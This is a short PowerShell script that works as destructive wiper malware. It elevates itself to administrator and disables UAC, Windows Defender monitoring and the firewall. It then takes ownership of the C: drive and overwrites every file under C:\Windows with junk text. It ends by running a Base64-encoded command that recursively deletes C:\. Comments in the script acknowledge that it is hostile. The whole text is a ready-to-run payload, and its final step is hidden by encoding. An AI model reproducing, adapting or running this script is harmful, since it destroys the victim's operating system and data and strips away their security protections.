# --- SELF-ELEVATION BLOCK ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}
# Disable UAC (This is a massive red flag)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 
# Attempt to kill Windows Defender and Firewalls
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
netsh advfirewall set allprofiles state off
#Grant The Administators Privilege To Delete Critical Files
taKeown /F /R c:\
icacls C:\ /grant *S-1-5-32-544:F
# Instead of just deleting, "corrupt" them first
Get-ChildItem C:\Windows -Recurse | ForEach-Object { 
    "NAH BRO" | Out-File $_.FullName -Force 
}
# Then delete
$code = "UmVtb3ZlLUl0ZW0gQzpcIC1SZWN1cnNlIC1Gb3JjZQ==" # This is Base64 for your delete command
powershell.exe -EncodedCommand $code